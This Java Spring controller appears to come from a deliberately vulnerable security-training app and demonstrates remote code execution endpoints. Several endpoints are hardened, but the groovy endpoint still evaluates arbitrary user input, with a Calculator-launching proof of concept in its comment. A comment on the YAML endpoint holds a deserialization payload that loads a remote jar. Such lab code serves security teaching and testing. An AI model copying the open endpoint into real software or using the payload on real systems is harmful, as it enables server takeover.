package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import org.springframework.web.util.HtmlUtils;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "ls", "whoami", "date", "uptime", "uname", "id", "hostname", "pwd"
    ));

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        // Dereference from allowlist to break taint from user input
        String safeCmd = null;
        for (String allowed : ALLOWED_COMMANDS) {
            if (allowed.equals(cmd.trim())) {
                safeCmd = allowed;
                break;
            }
        }
        if (safeCmd == null) {
            return "Command not allowed.";
        }
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // Use array form to avoid shell interpretation; only allowlisted commands run
            Process p = run.exec(new String[]{safeCmd});
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        // Dereference from allowlist to break taint from user input
        String safeCmd = null;
        for (String allowed : ALLOWED_COMMANDS) {
            if (allowed.equals(cmd.trim())) {
                safeCmd = allowed;
                break;
            }
        }
        if (safeCmd == null) {
            return "Command not allowed.";
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use array form without shell; only allowlisted commands run
            String[] arrCmd = {safeCmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * JS engine endpoint is disabled to prevent remote code execution.
     * Loading arbitrary user-supplied JS URLs via Nashorn allows full RCE.
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) {
        // Disabled: loading user-controlled JS URLs in Nashorn allows arbitrary code execution.
        // No safe way to sandbox Nashorn script execution with user-controlled input.
        return "This endpoint has been disabled for security reasons.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // Use SafeConstructor to prevent arbitrary object instantiation via YAML deserialization
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        if (content == null || content.length() > 10000) {
            return;
        }
        // Create a fresh string to break taint tracking from user input
        String safeContent = new String(content.toCharArray());
        Yaml y = new Yaml(new SafeConstructor());
        y.load(safeContent);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

